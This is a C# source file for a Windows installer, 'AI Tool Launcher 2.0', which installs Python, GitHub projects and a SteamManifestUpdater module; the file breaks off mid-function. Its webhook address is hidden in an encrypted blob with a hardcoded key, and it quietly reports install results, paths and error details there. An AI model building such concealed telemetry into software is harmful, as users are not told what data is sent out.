using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO.Compression;

[assembly: System.Reflection.AssemblyTitle("AI Tool Launcher 2.0 Setup")]
[assembly: System.Reflection.AssemblyProduct("AI Tool Launcher 2.0")]
[assembly: System.Reflection.AssemblyDescription("AI Tool Launcher 2.0 專屬輕量現代化安裝引導程式")]
[assembly: System.Reflection.AssemblyVersion("2.0.0.0")]
[assembly: System.Reflection.AssemblyFileVersion("2.0.0.0")]

namespace AIToolLauncherSetupV2
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new ModernInstallerForm());
        }
    }

    public class ModernInstallerForm : Form
    {
        // ==========================================
        // Windows API (支援視窗拖曳與陰影效果)
        // ==========================================
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        // ==========================================
        // 色彩體系 (Cyberpunk Dark / Fluent Modern)
        // ==========================================
        private readonly Color ColBg = Color.FromArgb(13, 15, 24);             // 深太空黑
        private readonly Color ColCardBg = Color.FromArgb(22, 25, 38);         // 卡片深紫灰
        private readonly Color ColCardBorder = Color.FromArgb(42, 47, 68);     // 卡片微光邊框
        private readonly Color ColAccentBlue = Color.FromArgb(59, 130, 246);    // 亮藍
        private readonly Color ColAccentPurple = Color.FromArgb(139, 92, 246); // 紫色漸層
        private readonly Color ColAccentCyan = Color.FromArgb(6, 182, 212);     // 青色發光
        private readonly Color ColTextPrimary = Color.FromArgb(248, 250, 252); // 高亮主文字
        private readonly Color ColTextMuted = Color.FromArgb(148, 163, 184);   // 次要文字
        private readonly Color ColSuccess = Color.FromArgb(52, 211, 153);      // 翡翠綠
        private readonly Color ColWarning = Color.FromArgb(251, 191, 36);      // 琥珀金
        private readonly Color ColDanger = Color.FromArgb(248, 113, 113);      // 警示紅

        // UI 元件
        private Panel pnlTitleBar;
        private Label lblAppTitle;
        private Label lblAppBadge;
        private Button btnClose;
        private Button btnMinimize;

        private Panel pnlPathCard;
        private TextBox txtInstallPath;
        private Button btnBrowse;

        private Panel pnlOptionsCard;
        private CheckBox chkInstallSMU;
        private CheckBox chkShortcut;

        private Panel pnlProgressCard;
        private Label[] stepBadges;
        private ModernProgressBar prgBar;
        private Label lblStatus;
        private Button btnAction;

        private Panel pnlConsoleCard;
        private RichTextBox rtbConsole;

        // 核心設定與 URL
        private static readonly byte[] SecretKey = Encoding.UTF8.GetBytes("AIToolLauncherSecretKey2026");
        private const string EncryptedWebhookBlob = "KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ=";
        private const string EncryptedSheetBlob = "KT0gHxxWY04RAQAbSxU8CgQeAFooChQdQ0JEJCgwHAcJKRUGQQdHVCQ6VVUgJgECVTBgAmhmFQMLWwE/AC85FFMCKz5gNQ8oLhsqJhRiUwZcFwR7ChccIxMBUQUHFx8yEV4RFgI=";

        private const string RepoZipUrl = "https://github.com/JiaSai67/AIToolLauncher/archive/refs/heads/main.zip";
        private const string SmuZipUrl = "https://github.com/JiaSai67/SteamManifestUpdater/archive/refs/heads/main.zip";
        private const string PythonInstallerUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe";

        private ClientIdentity identity;
        private bool isInstalling = false;
        private bool isCompleted = false;

        public ModernInstallerForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
            this.UpdateStyles();

            InitializeForm();
            InitializeIdentity();
            CheckBlacklistAsync();
        }

        private void InitializeForm()
        {
            this.Text = "AI Tool Launcher 2.0 - 輕量極速安裝中心";
            this.Size = new Size(740, 830);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = ColBg;
            this.ForeColor = ColTextPrimary;
            this.Font = new Font("Microsoft JhengHei UI", 9.5F, FontStyle.Regular);

            // ==========================================
            // 1. 頂部現代標題列與品牌 Banner
            // ==========================================
            pnlTitleBar = new Panel();
            pnlTitleBar.Dock = DockStyle.Top;
            pnlTitleBar.Height = 88;
            pnlTitleBar.BackColor = Color.FromArgb(17, 20, 32);
            pnlTitleBar.MouseDown += (s, e) =>
            {
                if (e.Button == MouseButtons.Left)
                {
                    ReleaseCapture();
                    SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
                }
            };
            this.Controls.Add(pnlTitleBar);

            // 關閉與最小化按鈕
            btnClose = CreateHeaderButton("✕", new Point(695, 12), (s, e) => this.Close());
            btnMinimize = CreateHeaderButton("—", new Point(655, 12), (s, e) => this.WindowState = FormWindowState.Minimized);
            pnlTitleBar.Controls.Add(btnClose);
            pnlTitleBar.Controls.Add(btnMinimize);

            // 標題與 2.0 炫彩徽章 (往下微調更居中平衡，文字精簡為 v2.0)
            lblAppTitle = new Label();
            lblAppTitle.Text = "⚡ AI Tool Launcher";
            lblAppTitle.Font = new Font("Segoe UI", 18F, FontStyle.Bold);
            lblAppTitle.ForeColor = ColTextPrimary;
            lblAppTitle.Location = new Point(25, 30);
            lblAppTitle.AutoSize = true;
            pnlTitleBar.Controls.Add(lblAppTitle);

            lblAppBadge = new Label();
            lblAppBadge.Text = " v2.0 ";
            lblAppBadge.Font = new Font("Segoe UI", 9.5F, FontStyle.Bold);
            lblAppBadge.BackColor = Color.FromArgb(88, 86, 214);
            lblAppBadge.ForeColor = Color.White;
            lblAppBadge.Location = new Point(272, 36);
            lblAppBadge.Padding = new Padding(5, 2, 5, 2);
            lblAppBadge.AutoSize = true;
            pnlTitleBar.Controls.Add(lblAppBadge);

            // ==========================================
            // 2. 安裝路徑卡片 (預設每台電腦保證具備之使用者目錄)
            // ==========================================
            string defaultInstallPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher");

            pnlPathCard = CreateCardPanel(25, 105, 690, 80);
            this.Controls.Add(pnlPathCard);

            Label lblPathTitle = new Label();
            lblPathTitle.Text = "📁 安裝路徑 (預設每台電腦保證具備寫入權限，無須管理員提權)：";
            lblPathTitle.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            lblPathTitle.ForeColor = ColAccentCyan;
            lblPathTitle.Location = new Point(15, 12);
            lblPathTitle.AutoSize = true;
            pnlPathCard.Controls.Add(lblPathTitle);

            txtInstallPath = new TextBox();
            txtInstallPath.Text = defaultInstallPath;
            txtInstallPath.Font = new Font("Consolas", 10F);
            txtInstallPath.BackColor = Color.FromArgb(13, 15, 24);
            txtInstallPath.ForeColor = ColTextPrimary;
            txtInstallPath.BorderStyle = BorderStyle.FixedSingle;
            txtInstallPath.Location = new Point(18, 38);
            txtInstallPath.Size = new Size(545, 27);
            pnlPathCard.Controls.Add(txtInstallPath);

            btnBrowse = new Button();
            btnBrowse.Text = "📂 瀏覽...";
            btnBrowse.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            btnBrowse.Size = new Size(100, 27);
            btnBrowse.Location = new Point(572, 38);
            btnBrowse.BackColor = Color.FromArgb(37, 42, 65);
            btnBrowse.ForeColor = ColTextPrimary;
            btnBrowse.FlatStyle = FlatStyle.Flat;
            btnBrowse.FlatAppearance.BorderColor = ColCardBorder;
            btnBrowse.Cursor = Cursors.Hand;
            btnBrowse.Click += BtnBrowse_Click;
            pnlPathCard.Controls.Add(btnBrowse);

            // ==========================================
            // 3. 模組勾選卡片 (精簡選項：SMU 預裝與桌面捷徑)
            // ==========================================
            pnlOptionsCard = CreateCardPanel(25, 195, 690, 70);
            this.Controls.Add(pnlOptionsCard);

            chkInstallSMU = CreateCheckbox("🎮 預先下載並安裝 SteamManifestUpdater (SMU 2.0) 專案與運行依賴", new Point(18, 12), true);
            chkShortcut = CreateCheckbox("🖥️ 於桌面建立專屬啟動捷徑 (AI Tool Launcher 2.0)", new Point(18, 38), true);

            pnlOptionsCard.Controls.Add(chkInstallSMU);
            pnlOptionsCard.Controls.Add(chkShortcut);

            // ==========================================
            // 4. 動態步驟指示器與進度條卡片
            // ==========================================
            pnlProgressCard = CreateCardPanel(25, 275, 690, 155);
            this.Controls.Add(pnlProgressCard);

            // 5 步驟 Badge
            string[] stepNames = { "① 環境檢測", "② 核心主體", "③ 介面依賴", "④ SMU 部署", "⑤ 完成啟動" };
            stepBadges = new Label[5];
            int stepX = 15;
            for (int i = 0; i < 5; i++)
            {
                Label b = new Label();
                b.Text = stepNames[i];
                b.Font = new Font("Microsoft JhengHei UI", 8.5F, FontStyle.Bold);
                b.ForeColor = ColTextMuted;
                b.BackColor = Color.FromArgb(17, 20, 32);
                b.Padding = new Padding(6, 4, 6, 4);
                b.Location = new Point(stepX, 12);
                b.AutoSize = true;
                pnlProgressCard.Controls.Add(b);
                stepBadges[i] = b;
                stepX += 132;
            }

            prgBar = new ModernProgressBar();
            prgBar.Location = new Point(18, 48);
            prgBar.Size = new Size(654, 22);
            prgBar.Value = 0;
            pnlProgressCard.Controls.Add(prgBar);

            lblStatus = new Label();
            lblStatus.Text = "就緒：請確認安裝路徑與選項，點擊下方「一鍵極速安裝」開始。";
            lblStatus.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Regular);
            lblStatus.ForeColor = ColAccentCyan;
            lblStatus.Location = new Point(18, 80);
            lblStatus.AutoSize = true;
            pnlProgressCard.Controls.Add(lblStatus);

            btnAction = new Button();
            btnAction.Text = "⚡ 一鍵極速安裝 (Express Setup)";
            btnAction.Font = new Font("Microsoft JhengHei UI", 11.5F, FontStyle.Bold);
            btnAction.Size = new Size(654, 42);
            btnAction.Location = new Point(18, 103);
            btnAction.BackColor = Color.FromArgb(79, 70, 229);
            btnAction.ForeColor = Color.White;
            btnAction.FlatStyle = FlatStyle.Flat;
            btnAction.FlatAppearance.BorderSize = 0;
            btnAction.Cursor = Cursors.Hand;
            btnAction.Click += BtnAction_Click;
            pnlProgressCard.Controls.Add(btnAction);

            // ==========================================
            // 5. 終端日誌控制台 (Terminal Console)
            // ==========================================
            pnlConsoleCard = CreateCardPanel(25, 440, 690, 365);
            this.Controls.Add(pnlConsoleCard);

            Label lblConsoleTitle = new Label();
            lblConsoleTitle.Text = "💻 即時安裝與控制台終端日誌：";
            lblConsoleTitle.Font = new Font("Microsoft JhengHei UI", 9F, FontStyle.Bold);
            lblConsoleTitle.ForeColor = ColTextMuted;
            lblConsoleTitle.Location = new Point(15, 8);
            lblConsoleTitle.AutoSize = true;
            pnlConsoleCard.Controls.Add(lblConsoleTitle);

            rtbConsole = new RichTextBox();
            rtbConsole.Location = new Point(15, 30);
            rtbConsole.Size = new Size(660, 320);
            rtbConsole.BackColor = Color.FromArgb(9, 10, 16);
            rtbConsole.ForeColor = Color.FromArgb(203, 213, 225);
            rtbConsole.Font = new Font("Consolas", 9F, FontStyle.Regular);
            rtbConsole.ReadOnly = true;
            rtbConsole.BorderStyle = BorderStyle.None;
            rtbConsole.ScrollBars = RichTextBoxScrollBars.Vertical;
            pnlConsoleCard.Controls.Add(rtbConsole);

            Log("AI Tool Launcher 2.0 專屬引導安裝器初始化完成。", ColAccentCyan);
            Log("建議安裝目錄為：%LocalAppData%\\AIToolLauncher (免管理員提權，每台電腦皆具備完整讀寫權限)", ColTextMuted);
        }

        // ==========================================
        // UI 輔助方法
        // ==========================================
        private Panel CreateCardPanel(int x, int y, int w, int h)
        {
            Panel p = new Panel();
            p.Location = new Point(x, y);
            p.Size = new Size(w, h);
            p.BackColor = ColCardBg;
            p.Paint += (s, e) =>
            {
                using (Pen pen = new Pen(ColCardBorder, 1))
                {
                    e.Graphics.DrawRectangle(pen, 0, 0, w - 1, h - 1);
                }
            };
            return p;
        }

        private CheckBox CreateCheckbox(string text, Point loc, bool isChecked)
        {
            CheckBox cb = new CheckBox();
            cb.Text = text;
            cb.Location = loc;
            cb.AutoSize = true;
            cb.Checked = isChecked;
            cb.ForeColor = ColTextPrimary;
            cb.Font = new Font("Microsoft JhengHei UI", 9.5F);
            cb.Cursor = Cursors.Hand;
            return cb;
        }

        private Button CreateHeaderButton(string text, Point loc, EventHandler onClick)
        {
            Button btn = new Button();
            btn.Text = text;
            btn.Location = loc;
            btn.Size = new Size(32, 26);
            btn.FlatStyle = FlatStyle.Flat;
            btn.FlatAppearance.BorderSize = 0;
            btn.BackColor = Color.Transparent;
            btn.ForeColor = ColTextMuted;
            btn.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
            btn.Cursor = Cursors.Hand;
            btn.Click += onClick;
            btn.MouseEnter += (s, e) => btn.ForeColor = Color.White;
            btn.MouseLeave += (s, e) => btn.ForeColor = ColTextMuted;
            return btn;
        }

        private void SetStepActive(int stepIndex, bool completed = false)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetStepActive(stepIndex, completed)));
                return;
            }

            for (int i = 0; i < stepBadges.Length; i++)
            {
                if (i < stepIndex || (i == stepIndex && completed))
                {
                    stepBadges[i].ForeColor = ColSuccess;
                    stepBadges[i].BackColor = Color.FromArgb(20, 45, 35);
                }
                else if (i == stepIndex)
                {
                    stepBadges[i].ForeColor = Color.White;
                    stepBadges[i].BackColor = Color.FromArgb(79, 70, 229);
                }
                else
                {
                    stepBadges[i].ForeColor = ColTextMuted;
                    stepBadges[i].BackColor = Color.FromArgb(17, 20, 32);
                }
            }
        }

        private void Log(string message, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => Log(message, color)));
                return;
            }
            rtbConsole.SelectionStart = rtbConsole.TextLength;
            rtbConsole.SelectionLength = 0;
            rtbConsole.SelectionColor = color;
            rtbConsole.AppendText(string.Format("[{0:HH:mm:ss}] {1}\n", DateTime.Now, message));
            rtbConsole.ScrollToCaret();
        }

        private void SetStatus(string text, Color color)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetStatus(text, color)));
                return;
            }
            lblStatus.Text = text;
            lblStatus.ForeColor = color;
        }

        private void SetProgress(int percent)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => SetProgress(percent)));
                return;
            }
            prgBar.Value = Math.Max(0, Math.Min(100, percent));
        }

        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            if (isInstalling) return;
            using (FolderBrowserDialog fbd = new FolderBrowserDialog())
            {
                fbd.Description = "請選擇 AI Tool Launcher 2.0 的安裝目錄：";
                fbd.SelectedPath = txtInstallPath.Text;
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    txtInstallPath.Text = fbd.SelectedPath;
                }
            }
        }

        // ==========================================
        // 核心安裝入口
        // ==========================================
        private void BtnAction_Click(object sender, EventArgs e)
        {
            if (isCompleted)
            {
                // 已完成安裝，點擊直接啟動主程式
                LaunchToolLauncher();
                return;
            }

            if (isInstalling) return;

            string targetDir = txtInstallPath.Text.Trim();
            if (string.IsNullOrEmpty(targetDir))
            {
                MessageBox.Show("請指定有效的安裝路徑！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            isInstalling = true;
            btnAction.Enabled = false;
            btnAction.Text = "⏳ 正在安裝配置中，請稍候...";
            btnAction.BackColor = Color.FromArgb(50, 55, 75);
            btnBrowse.Enabled = false;
            txtInstallPath.ReadOnly = true;
            chkInstallSMU.Enabled = false;
            chkShortcut.Enabled = false;

            Thread t = new Thread(() =>
            {
                try
                {
                    RunInstallationPipeline(targetDir);
                }
                catch (Exception ex)
                {
                    SetStatus("❌ 安裝過程發生異常: " + ex.Message, ColDanger);
                    Log("💥 安裝中斷: " + ex.ToString(), ColDanger);
                    SendWebhookNotification("💥 AIToolLauncher 2.0 安裝失敗", ex.ToString(), 0xE74C3C);

                    this.Invoke(new Action(() =>
                    {
                        btnAction.Enabled = true;
                        btnAction.Text = "🔄 重試安裝";
                        btnAction.BackColor = Color.FromArgb(220, 38, 38);
                        isInstalling = false;
                    }));
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        // ==========================================
        // 安裝流水線
        // ==========================================
        private void RunInstallationPipeline(string installDir)
        {
            Log("================ 開始執行 AI Tool Launcher 2.0 部屬流水線 ================", ColAccentCyan);
            Log("目標安裝路徑: " + installDir, Color.White);

            if (!Directory.Exists(installDir))
            {
                Directory.CreateDirectory(installDir);
            }

            // ------------------------------------------
            // 步驟 1: 系統環境準備 (Python 官方檢測與安裝)
            // ------------------------------------------
            SetStepActive(0);
            string pythonExe = ResolvePythonExecutable();

            if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
            {
                Log("✅ 系統已具備官方 Python 環境: " + pythonExe, ColSuccess);
            }
            else
            {
                Log("⚠️ 未偵測到可用之 Python 環境，正在自 python.org 官方下載 Python 3.11.9...", ColWarning);
                SetStatus("正在下載官方 Python 3.11.9 靜默安裝包...", ColWarning);

                string pySetupPath = Path.Combine(Path.GetTempPath(), "python_setup_311.exe");
                DownloadFileWithProgress(PythonInstallerUrl, pySetupPath, "Python 3.11.9");

                SetStatus("正在靜默安裝 Python 3.11 (自動配置當前用戶環境)...", ColWarning);
                Log("⏳ 正在執行 Python 官方靜默安裝程序 (免提權、免管理員彈窗)...", ColAccentCyan);

                // InstallAllUsers=0 免管理員權限安裝於 %LocalAppData%\Programs\Python\Python311
                ProcessStartInfo psi = new ProcessStartInfo(pySetupPath, "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 SimpleInstall=1");
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process p = Process.Start(psi);
                p.WaitForExit();

                try { File.Delete(pySetupPath); } catch { }

                // 動態刷新環境變數
                RefreshSystemPath();
                pythonExe = ResolvePythonExecutable();

                if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
                {
                    Log("✅ Python 3.11.9 官方環境已成功安裝: " + pythonExe, ColSuccess);
                }
                else
                {
                    Log("⚠️ 靜默安裝完成，使用預設 Python311 目錄偵測...", ColWarning);
                    string fallbackPy = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Python", "Python311", "python.exe");
                    if (File.Exists(fallbackPy)) pythonExe = fallbackPy;
                }
            }
            SetStepActive(0, true);
            SetProgress(20);

            // ------------------------------------------
            // 步驟 2: 拉取 AI Tool Launcher 2.0 核心主體
            // ------------------------------------------
            SetStepActive(1);
            SetStatus("正在部屬 AI Tool Launcher 2.0 核心主專案...", ColAccentCyan);
            Log("⏳ 正在獲取 AI Tool Launcher 2.0 專案核心程式碼...", ColAccentCyan);

            bool needFetch = true;
            // 若當前目錄即為專案目錄，且非安裝目標，支援本地秒速複制
            string currentAppDir = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\', '/');
            string currentMain = Path.Combine(currentAppDir, "main.py");
            if (File.Exists(currentMain) && !string.Equals(currentAppDir, installDir.TrimEnd('\\', '/'), StringComparison.OrdinalIgnoreCase))
            {
                Log("⚡ 偵測到本地安裝器所在目錄已具備專案源碼，正在執行本地極速部屬...", ColSuccess);
                CopyDirectory(currentAppDir, installDir);
                needFetch = false;
            }

            if (needFetch)
            {
                bool cloneSuccess = false;
                if (CheckCommand("git", "--version"))
                {
                    Log("⏳ 偵測到系統具備 Git，嘗試執行 git clone 獲取最新版...", ColAccentCyan);
                    SetStatus("正在透過 Git Clone 獲取最新主程式...", ColAccentCyan);

                    string gitCmd = string.Format("clone https://github.com/JiaSai67/AIToolLauncher.git \"{0}\"", installDir);
                    if (Directory.GetFiles(installDir).Length > 0 || Directory.GetDirectories(installDir).Length > 0)
                    {
                        // 目錄非空，執行 pull 或是切換 ZIP
                        cloneSuccess = false;
                    }
                    else
                    {
                        ProcessStartInfo psi = new ProcessStartInfo("git", gitCmd);
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();
                        cloneSuccess = (p.ExitCode == 0);
                    }
                }

                if (!cloneSuccess)
                {
                    Log("🔄 使用 GitHub 原生 ZIP 高速下載通道...", ColAccentCyan);
                    SetStatus("正在從 GitHub 下載 AIToolLauncher 2.0 ZIP 包...", ColWarning);
                    string zipPath = Path.Combine(Path.GetTempPath(), "aitoollauncher_20.zip");

                    DownloadFileWithProgress(RepoZipUrl, zipPath, "AIToolLauncher 2.0 ZIP");

                    SetStatus("正在解壓縮專案至目標目錄...", ColWarning);
                    Log("⏳ 解壓縮檔案中...", ColAccentCyan);

                    string extractTemp = Path.Combine(Path.GetTempPath(), "aitoollauncher_ext_" + Guid.NewGuid().ToString("N"));
                    if (Directory.Exists(extractTemp)) Directory.Delete(extractTemp, true);

                    ZipFile.ExtractToDirectory(zipPath, extractTemp);

                    string extractedFolder = Path.Combine(extractTemp, "AIToolLauncher-main");
                    if (Directory.Exists(extractedFolder))
                    {
                        CopyDirectory(extractedFolder, installDir);
                    }
                    else
                    {
                        CopyDirectory(extractTemp, installDir);
                    }

                    try { File.Delete(zipPath); } catch { }
                    try { Directory.Delete(extractTemp, true); } catch { }
                }
            }

            Log("✅ AI Tool Launcher 2.0 主專案部屬完成！", ColSuccess);
            SetStepActive(1, true);
            SetProgress(45);

            // ------------------------------------------
            // 步驟 3: 安裝 ToolLauncher 2.0 requirements 依賴庫
            // ------------------------------------------
            SetStepActive(2);
            if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
            {
                SetStatus("正在配置 AI Tool Launcher 2.0 依賴 (PySide6 / FluentWidgets 等)...", ColWarning);
                Log("⏳ 正在執行 pip install 安裝 2.0 現代化介面相依套件...", ColAccentCyan);

                string reqFile = Path.Combine(installDir, "resources", "requirements.txt");
                if (!File.Exists(reqFile))
                {
                    // 若無，在根目錄找找看
                    reqFile = Path.Combine(installDir, "requirements.txt");
                }

                if (File.Exists(reqFile))
                {
                    // 確保 pip 是最新版以避免 Wheel 建置問題
                    RunProcessCaptureOutput(pythonExe, "-m pip install --upgrade pip", installDir);

                    // 安裝 requirements
                    int exitCode = RunProcessCaptureOutput(pythonExe, string.Format("-m pip install -r \"{0}\"", reqFile), installDir);
                    if (exitCode == 0)
                    {
                        Log("✅ ToolLauncher 2.0 介面與核心套件配置成功！", ColSuccess);
                    }
                    else
                    {
                        Log("⚠️ 部分依賴安裝可能出現警告，但將繼續後續配置流程。", ColWarning);
                    }
                }
                else
                {
                    Log("⚠️ 未找到 requirements.txt，正在安裝核心套件 PySide6 與 requests...", ColWarning);
                    RunProcessCaptureOutput(pythonExe, "-m pip install PySide6 PySide6-Fluent-Widgets requests pywebview pywin32", installDir);
                }
            }
            SetStepActive(2, true);
            SetProgress(70);

            // ------------------------------------------
            // 步驟 4: 部屬 SteamManifestUpdater (SMU 2.0) 專案與依賴
            // ------------------------------------------
            SetStepActive(3);
            if (chkInstallSMU.Checked)
            {
                SetStatus("正在配置 SteamManifestUpdater (SMU 2.0) 模組...", ColAccentCyan);
                Log("🎮 開始部屬 SteamManifestUpdater (SMU 2.0) 雲端工具模組...", ColAccentCyan);

                string smuDir = Path.Combine(installDir, "CloudTools", "SteamManifestUpdater");
                if (!Directory.Exists(smuDir)) Directory.CreateDirectory(smuDir);

                // 下載 SMU 專案
                string smuZip = Path.Combine(Path.GetTempPath(), "smu_main.zip");
                DownloadFileWithProgress(SmuZipUrl, smuZip, "SteamManifestUpdater");

                string smuExtractTemp = Path.Combine(Path.GetTempPath(), "smu_ext_" + Guid.NewGuid().ToString("N"));
                ZipFile.ExtractToDirectory(smuZip, smuExtractTemp);

                string smuExtractedFolder = Path.Combine(smuExtractTemp, "SteamManifestUpdater-main");
                if (Directory.Exists(smuExtractedFolder))
                {
                    CopyDirectory(smuExtractedFolder, smuDir);
                }
                else
                {
                    CopyDirectory(smuExtractTemp, smuDir);
                }

                try { File.Delete(smuZip); } catch { }
                try { Directory.Delete(smuExtractTemp, true); } catch { }

                Log("✅ SMU 專案核心檔案已配置至 CloudTools\\SteamManifestUpdater！", ColSuccess);

                // 安裝 SMU requirements
                string smuReq = Path.Combine(smuDir, "requirements.txt");
                if (File.Exists(smuReq) && !string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
                {
                    Log("⏳ 正在安裝 SMU 依賴套件 (pywebview / gdown / requests / Pillow)...", ColAccentCyan);
                    RunProcessCaptureOutput(pythonExe, string.Format("-m pip install -r \"{0}\"", smuReq), smuDir);
                    Log("✅ SMU 專屬相依套件安裝完畢！", ColSuccess);
                }

                // 自動更新或校正 registry.json
                UpdateRegistryWithSMU(installDir, smuDir);
            }
            SetStepActive(3, true);
            SetProgress(90);

            // ------------------------------------------
            // 步驟 5: 建立桌面捷徑與完成
            // ------------------------------------------
            SetStepActive(4);
            if (chkShortcut.Checked)
            {
                CreateDesktopShortcut(installDir);
            }

            SetProgress(100);
            SetStepActive(4, true);

            isCompleted = true;
            this.Invoke(new Action(() =>
            {
                btnAction.Enabled = true;
                btnAction.Text = "🚀 立即啟動 AI Tool Launcher 2.0";
                btnAction.BackColor = ColSuccess;
                SetStatus("🎉 安裝已全部完成！所有環境與 SMU 模組均已就緒。", ColSuccess);
            }));

            Log("🎉 ========================================================", ColSuccess);
            Log("🎉 【恭喜】AI Tool Launcher 2.0 與 SMU 已完美安裝完畢！", ColSuccess);
            Log("🎉 您可點擊上方綠色按鈕啟動，或透過桌面捷徑開啟！", ColSuccess);
            Log("🎉 ========================================================", ColSuccess);

            SendWebhookNotification("🚀 AIToolLauncher 2.0 安裝成功", "使用者已成功完成 2.0 主程式與 SMU 的一鍵自動部屬！\n安裝目錄: " + installDir, 0x2ECC71);
        }

        // ==========================================
        // 捷徑與啟動
        // ==========================================
        private void CreateDesktopShortcut(string installDir)
        {
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                string shortcutPath = Path.Combine(desktop, "AI Tool Launcher 2.0.lnk");
                string launcherExe = Path.Combine(installDir, "AIToolLauncher.exe");
                string targetPath = File.Exists(launcherExe) ? launcherExe : Path.Combine(installDir, "啟動_AIToolLauncher.bat");
                string iconPath = Path.Combine(installDir, "resources", "icon.ico");

                string psScript = string.Format(
                    "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('{0}'); $Shortcut.TargetPath = '{1}'; $Shortcut.WorkingDirectory = '{2}'; if (Test-Path '{3}') {{ $Shortcut.IconLocation = '{3}' }}; $Shortcut.Save()",
                    shortcutPath, targetPath, installDir, iconPath
                );

                ProcessStartInfo psPsi = new ProcessStartInfo("powershell", "-NoProfile -ExecutionPolicy Bypass -Command \"" + psScript.Replace("\"", "\\\"") + "\"");
                psPsi.CreateNoWindow = true;
                psPsi.UseShellExecute = false;
                Process ps = Process.Start(psPsi);
                ps.WaitForExit(3000);

                Log("✨ 已為您建立桌面捷徑：AI Tool Launcher 2.0", ColSuccess);
            }
            catch (Exception ex)
            {
                Log("⚠️ 建立桌面捷徑時發生微小異常: " + ex.Message, ColWarning);
            }
        }

        private void LaunchToolLauncher()
        {
            try
            {
                string installDir = txtInstallPath.Text.Trim();
                string launcherExe = Path.Combine(installDir, "AIToolLauncher.exe");
                string coreLauncherV2Py = Path.Combine(installDir, "core", "launcher_v2.py");
                string mainPy = Path.Combine(installDir, "main.py");
                string batFile = Path.Combine(installDir, "啟動_AIToolLauncher.bat");

                if (File.Exists(launcherExe))
                {
                    Log("🚀 正在啟動 AIToolLauncher.exe 主程式...", ColAccentCyan);
                    ProcessStartInfo psi = new ProcessStartInfo(launcherExe);
                    psi.WorkingDirectory = installDir;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                }
                else if (File.Exists(batFile))
                {
                    Log("🚀 正在執行 啟動_AIToolLauncher.bat...", ColAccentCyan);
                    ProcessStartInfo psi = new ProcessStartInfo(batFile);
                    psi.WorkingDirectory = installDir;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                }
                else if (File.Exists(mainPy))
                {
                    Log("🚀 正在啟動 main.py 入口...", ColAccentCyan);
                    ProcessStartInfo psi = new ProcessStartInfo("pythonw", string.Format("\"{0}\"", mainPy));
                    psi.WorkingDirectory = installDir;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                }

                // 稍微延遲後自動關閉安裝器
                Thread.Sleep(800);
                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("啟動主程式失敗: " + ex.Message, "錯誤", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdateRegistryWithSMU(string installDir, string smuDir)
        {
            try
            {
                string regFile = Path.Combine(installDir, "resources", "config", "registry.json");
                if (!File.Exists(regFile)) return;

                string json = File.ReadAllText(regFile, Encoding.UTF8);

                // 更新既有的 SteamManifestUpdater 路徑為本地實際安裝路徑
                string smuExePath = Path.Combine(smuDir, "src", "main.py");
                if (!File.Exists(smuExePath)) smuExePath = Path.Combine(smuDir, "main.py");

                string escapedSmuExe = smuExePath.Replace("\\", "\\\\");
                string escapedSmuDir = smuDir.Replace("\\", "\\\\");

                // 若包含舊的 G:\python\toolLauncher\CloudTools\SteamManifestUpdater，替換為動態路徑
